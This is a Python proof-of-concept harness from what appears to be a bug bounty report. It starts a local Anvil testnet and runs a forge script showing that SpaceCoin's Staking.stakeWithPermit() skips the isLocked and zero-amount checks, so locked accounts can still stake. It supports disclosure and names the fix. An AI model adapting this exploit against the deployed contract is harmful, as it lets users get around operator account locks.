#!/usr/bin/env python3
"""
PoC: Staking.stakeWithPermit() missing isLocked check -> locked account bypass
Finding: F5 -- MEDIUM (+ F6 LOW: missing amount==0 check)
Target:  gluwa/Spacecoin -- Staking contract (0x01BD109532d651DD9a0BF92C2658E8cB94081c1d)
Program: SpaceCoin CertIK SkyShield

Demonstrates:
  - stake() correctly rejects locked accounts with AccountIsLocked
  - stakeWithPermit() is missing the isLocked check -- locked accounts can stake
  - stakeWithPermit() also accepts amountToStake == 0 (which stake() rejects)

Usage:
    cd ~/CCNext-smart-contracts
    python3 ../bug-bounty-reports/SpaceCoin-CertIK/poc_staking_islocked_bypass.py
"""

import subprocess
import sys
import time
import os
import signal

REPO_DIR    = os.path.expanduser("~/CCNext-smart-contracts")
SCRIPT_PATH = "script/PocStakingIsLockedBypass.s.sol"
ANVIL_PORT  = 8549
ANVIL_HOST  = f"http://127.0.0.1:{ANVIL_PORT}"
OPERATOR_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

SEP = "=" * 70


def start_anvil():
    print("[*] Starting local Anvil testnet ...")
    proc = subprocess.Popen(
        ["anvil", "--port", str(ANVIL_PORT), "--silent"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1.5)
    if proc.poll() is not None:
        print("[!] Anvil failed to start -- is it installed? (brew install foundry)")
        sys.exit(1)
    print(f"[*] Anvil running on {ANVIL_HOST} (PID {proc.pid})")
    return proc


def run_forge_script():
    print(f"[*] Running forge script: {SCRIPT_PATH}")
    print()
    result = subprocess.run(
        [
            "forge", "script", SCRIPT_PATH,
            "--tc", "PocStakingIsLockedBypass",
            "--rpc-url", ANVIL_HOST,
            "--private-key", OPERATOR_KEY,
        ],
        capture_output=True,
        text=True,
        cwd=REPO_DIR,
    )
    return result


def parse_and_display(result):
    combined = result.stdout + result.stderr

    log_lines = []
    for line in combined.splitlines():
        stripped = line.strip()
        if any(stripped.startswith(p) for p in
               ("[deploy]", "[setup]", "[verify]", "[expected]", "[bypass]",
                "===", "stakeWithPermit", "Locked", "Fix:")):
            log_lines.append(stripped)

    # Deduplicate (forge prints twice: simulation + dry run)
    seen = set()
    unique_lines = []
    for line in log_lines:
        if line not in seen:
            seen.add(line)
            unique_lines.append(line)

    if not unique_lines:
        print("[!] Could not parse forge output -- printing raw stdout:")
        print(result.stdout[-4000:] if len(result.stdout) > 4000 else result.stdout)
        if result.returncode != 0:
            print("[!] STDERR:")
            print(result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr)
        return result.returncode == 0

    print(SEP)
    print("  SpaceCoin F5 -- Staking.stakeWithPermit() Missing isLocked Check PoC")
    print(SEP)
    print()
    for line in unique_lines:
        print(" ", line)
    print()

    if "ATTACK CONFIRMED" in combined:
        print(SEP)
        print("  RESULT: VULNERABILITY CONFIRMED")
        print("  stakeWithPermit() does not check stakeInfo[owner].isLocked.")
        print("  Locked accounts can bypass operator restrictions via permit path.")
        print("  Fix: add isLocked check and amount==0 check to stakeWithPermit().")
        print(SEP)
        return True
    else:
        print("[!] Expected '=== ATTACK CONFIRMED ===' not found.")
        if result.returncode != 0:
            print("[!] Exit code:", result.returncode)
            print(result.stderr[-1000:])
        return False


def main():
    print()
    print(SEP)
    print("  SpaceCoin F5 -- Staking.stakeWithPermit() Missing isLocked Check")
    print("  Operator Lock Bypass via ERC20 Permit Path")
    print(SEP)
    print()

    anvil = start_anvil()
    try:
        result = run_forge_script()
        ok = parse_and_display(result)
        sys.exit(0 if ok else 1)
    finally:
        print()
        print("[*] Shutting down Anvil ...")
        anvil.send_signal(signal.SIGTERM)
        anvil.wait()
        print("[*] Done.")


if __name__ == "__main__":
    main()
